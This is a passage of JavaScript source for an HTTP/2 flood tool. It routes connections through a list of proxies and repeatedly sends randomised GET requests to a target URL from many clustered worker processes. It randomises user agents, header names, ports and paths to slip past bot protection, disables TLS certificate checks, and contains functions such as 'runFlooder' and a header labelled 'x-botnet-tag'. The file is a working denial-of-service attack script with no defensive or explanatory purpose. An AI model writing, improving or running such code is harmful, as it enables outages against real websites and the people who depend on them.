'Mozilla/5.0 (X11; Linux armv7l; rv:95.0) Gecko/20100101 Firefox/95.0',
'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4657.124 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4653.100 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; en-US) Gecko/20100101 Firefox/89.0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4691.107 Safari/537.36',
'Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4655.154 Safari/537.36',
'Mozilla/5.0 (Linux; arm_64; Android 11; vivo 1906) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.1.114.00 SA/3 Mobile Safari/537.36',
'SAMSUNG-SM-B313E Opera/9.80 (J2ME/MIDP; Opera Mini/4.5.40318/191.256; U; en) Presto/2.12.423 Version/12.16',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
'ELinks/0.11.1-1.2ubuntu2.2-debian (textmode; Linux 2.6.20-16-generic i686; 80x24-2)',
'Mozilla/5.0 (Linux; Android 12; POCO F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; W-K130-TMV Build/OPM2.171019.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.4.2; MITO T10 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; moto g(7) plus Build/QPWS30.61-21-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; SM-G800H Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.114 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; TECNO AB7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; 6.0; Nomi i5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 3.2; en-us; Sony Tablet S Build/THMAS11000) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13',
'Mozilla/5.0 (Linux; Android 7.1.1; SM-J510MN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36 OPR/65.2.3381.61420',
'Mozilla/5.0 (Linux; Android 8.0.0; SM-G930R4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1',
'Opera/9.80 (Android; Opera Mini/20.0.2254/191.256; U; tr) Presto/2.12.423 Version/12.16',
'Mozilla/5.0 (Linux; Android 10; SM-G981V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; moto e5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 EdgA/96.0.1054.62',
'Mozilla/5.0 (Linux; Android 10; GM1917) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4692.56 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SM-A415F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/343.0.0.37.117;]',
'Mozilla/5.0 (Linux; Android 10; moto g power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; BQ-6040L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.92 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.1; ONEPLUS A3010 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7; rv:94.0) Gecko/20100101 Firefox/94.0',
'Mozilla/5.0 (Linux; Android 11; RMX2170) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/7.0.10(0x17000a21) NetType/WIFI Language/zh_CN'
 ];
const platformd = [
 "Windows",
 "Linux",
 "Android",
 "iOS",
 "Mac OS",
 "iPadOS",
 "BlackBerry OS",
 "Firefox OS",
];

const AnVu1 = [
  "110",
  "143",
  "220",
  "5432",
  "993",
  "587",
  "995",
  "22",
  "3306",
  "465",
]
const rdom2 = [
 "hello server",
 "hello cloudflare",
 "hello client",
 "hello world",
 "hello akamai",
 "hello cdnfly",
 "hello kitty"
];
const patch = [
 'application/json-patch+json',
  'application/xml-patch+xml',
  'application/merge-patch+json',
  'application/vnd.github.v3+json',
  'application/vnd.mozilla.xul+xml',
  'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  'application/vnd.oasis.opendocument.text',
  'application/vnd.sun.xml.writer',
  'text/x-diff',
  'text/x-patch'
];
const langua = [
 "; en-US",
 "; ko-KR",
 "; en-US",
 "; zh-CN",
 "; zh-TW",
 "; ja-JP",
 "; en-GB",
 "; en-AU",
 "; en-CA",
 "; en-NZ",
 "; en-ZA",
 "; en-IN",
 "; en-PH",
 "; en-SG",
 "; en-HK",
];
const FA = ['Amicable', 'Benevolent', 'Cacophony', 'Debilitate', 'Ephemeral',
  'Furtive', 'Garrulous', 'Harangue', 'Ineffable', 'Juxtapose', 'Kowtow',
  'Labyrinthine', 'Mellifluous', 'Nebulous', 'Obfuscate', 'Pernicious',
  'Quixotic', 'Rambunctious', 'Salient', 'Taciturn', 'Ubiquitous', 'Vexatious',
  'Wane', 'Xenophobe', 'Yearn', 'Zealot', 'Alacrity', 'Belligerent', 'Conundrum',
  'Deliberate', 'Facetious', 'Gregarious', 'Harmony', 'Insidious', 'Jubilant',
  'Kaleidoscope', 'Luminous', 'Meticulous', 'Nefarious', 'Opulent', 'Prolific',
  'Quagmire', 'Resilient', 'Serendipity', 'Tranquil', 'Ubiquity', 'Voracious', 'Whimsical'];
const FAB = ['X-Client-IP','Accepted','AccessKey','Age','Akamai-origin-hop','App','App-Env','Base-url','Basic','Cache-Info','Case-filter','Catalog-Server','Client-Address','Challenge-Response','CF-IP','CF-Temp-Path'];
const mad = ['Amicable', 'Benevolent', 'Cacophony', 'Debilitate', 'Ephemeral',
  'Furtive', 'Garrulous', 'Harangue', 'Ineffable', 'Juxtapose', 'Kowtow',
  'Labyrinthine', 'Mellifluous', 'Nebulous', 'Obfuscate', 'Pernicious',
  'Quixotic', 'Rambunctious', 'Salient', 'Taciturn', 'Ubiquitous', 'Vexatious',
  'Wane', 'Xenophobe', 'Yearn', 'Zealot', 'Alacrity', 'Belligerent', 'Conundrum',
  'Deliberate', 'Facetious', 'Gregarious', 'Harmony', 'Insidious', 'Jubilant',
  'Kaleidoscope', 'Luminous', 'Meticulous', 'Nefarious', 'Opulent', 'Prolific',
  'Quagmire', 'Resilient', 'Serendipity', 'Tranquil', 'Ubiquity', 'Voracious', 'Whimsical'];

 var FA1 = FA[Math.floor(Math.floor(Math.random() * FA.length))];
 var FAB1 = FAB[Math.floor(Math.floor(Math.random() * FAB.length))];
 var AnVu = AnVu1[Math.floor(Math.floor(Math.random() * AnVu1.length))];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var mad1 = mad[Math.floor(Math.floor(Math.random() * mad.length))];
 var langua1 = langua[Math.floor(Math.floor(Math.random() * langua.length))];
 var random = rdom2[Math.floor(Math.floor(Math.random() * rdom2.length))];
 var patched = patch[Math.floor(Math.floor(Math.random() * patch.length))];
 var platformx = platformd[Math.floor(Math.floor(Math.random() * platformd.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
 var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
 var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);
 
 function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
function taoDoiTuongNgauNhien() {
  const doiTuong = {};
  const kyTuNgauNhien = 'abcdefghijk';
  const kyTuNgauNhienk = '123456789';
kill = Math.floor(Math.random() * (30 - 5 + 1)) + 5;
  for (let i = 1; i <= kill; i++) {
    const key = 'Sec-' + kyTuNgauNhien[Math.floor(Math.random() * kyTuNgauNhien.length)];
    const value =  'Public-Age=' + kyTuNgauNhienk[Math.floor(Math.random() * kyTuNgauNhienk.length)];

    doiTuong[key] = value;
  }

  return doiTuong;
}
function taoDoiTuongNgauNhiens() {
  const doiTuong = {};
  const kyTuNgauNhien = '123456789';
  const mathop = 'lmnopqrstuvwxyz123456789';
kik= Math.floor(Math.random() * (30 - 5 + 1)) + 5;
  for (let i = 1; i <= kik ; i++) {
    const key = generateRandomString(1,4) + '-' + mathop[Math.floor(Math.random() * mathop.length)]; 
    const value = 'max-age=' + kyTuNgauNhien[Math.floor(Math.random() * kyTuNgauNhien.length)];

    doiTuong[key] = value;
  }

  return doiTuong;
}
const doiTuongNgauNhien = taoDoiTuongNgauNhien();

var multi = taoDoiTuongNgauNhiens();
var multi1 = taoDoiTuongNgauNhien();
var multi2 = FA1 + "-" + FAB1 + ": " + mad1 + "-" + generateRandomString(4,25);
var multi3 = FA1 + "-" + FAB1 + ": " + mad1 + "-" + generateRandomString(4,25);

const MAX_RAM_PERCENTAGE = 80;
const RESTART_DELAY = 1000;

 if (cluster.isMaster) {
    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script via', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage percentage exceeded:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
  setInterval(handleRAMUsage, 1000);
  
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
 async HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = await net.connect({
         host: options.host,
         port: options.port
     });
 
     connection.setTimeout(options.timeout * 600000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }
 
 const path = parsedTarget.path.replace(/%RAND%/, () => Array.from({ length: 16 }, () => Math.floor(Math.random() * 36).toString(36)).join(''));
 const Socker = new NetSocket();
 headers[":method"] = "GET";

  function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");

     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100,
     };

     Socker.HTTP(proxyOptions, async (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 600000);

         const tlsOptions = {
            rejectUnauthorized: false,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            socket: connection,
 	//ciphers: cipper
	 secureProtocol: ['TLSv1.3_method', 'TLSv1.2_method', 'TLS_GREASE']
	, echdCurve: "X25519"
, sigalgs:`ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256`
	, secure: true
	, rejectUnauthorized: false
	, ALPNProtocols: ['h2']
, allowHalfOpen: true
, highWaterMark: 16*2011
	, secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom
, };

         const tlsConn = await tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60000);

         const client = await http2.connect(parsedTarget.href, {
             protocol: "https",
             settings: {
              ...(Math.random() < 0.5 ? {headerTableSize:65536} : {}),
              enablePush:false,
              ...(Math.random() < 0.5 ? {maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000} : {}),
             
              ...(Math.random() < 0.5 ?	{initialWindowSize: Math.random() < 0.5 ? 6291456 :33554432} : {}),
                
                  ...(Math.random() < 0.5 ? {maxFrameSize : 15000} : {}),
                 ...(Math.random() < 0.5 ? {maxHeaderListSize:262144} : {}),
          },
             createConnection: () => tlsConn,
         });
 
         client.on("connect", async () => {
            const IntervalAttack = setInterval(async () => {
function shuffleObject(obj) {
          const keys = Object.keys(obj);
          
          for (let i = keys.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [keys[i], keys[j]] = [keys[j], keys[i]];
          }
          
          const shuffledObject = {};
          for (const key of keys) {
            shuffledObject[key] = obj[key];
          }
          
          return shuffledObject;
          }

const secdata = {
		"sec-fetch-mode": "navigate",
"sec-fetch-user": "?3",
	  }

const header = {
 ":method": "GET",
 ":authority": parsedTarget.host + ":"+ AnVu,
 ":scheme": "https",  
 ":path": path,
 //"sec-purpose": "prefetch;prerender",
 "Sec-Ch-Ua-Platform": platformd,
 ...(Math.random() < 0.5 ? {"x-botnet-tag": "RATE"}: {}),
 "user-agent": uap1 + generateRandomString(1,9),
 ...(Math.random() < 0.5 ? { "purpose": "prefetch"} : {} ),
 ...(Math.random() < 0.5 ?{"upgrade-insecure-requests": "1"} : { }),
 ...(Math.random() < 0.75 ? secdata : {}),
}

let dynHeaders = await shuffleObject({
	"sec-fetch-dest": "document",
  "x-forwarded-proto" : "https",
	"accept-encoding": "gzip, deflate, br",
	"accept-language": "vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3",
	...(Math.random() < 0.5 ?{['x-sec-width-from-'+ generateRandomString(1,9)]: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)} : {}),
	...(Math.random() < 0.5 ?{['user-x-with-'+ generateRandomString(1,9)]: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)} : {}),
   ['x-c-python-'+ generateRandomString(1,9)]: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12),
	})
			datas = await { 
	...header,
	...dynHeaders,
	  }
                //console.log(datas);
                for (let i = 0; i < args.Rate; i++) {
          const request = await client.request(datas);
                    client.on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
                    request.end();
                }
        }, 300); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
     }),function (error, response, body) {
    };
 }
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);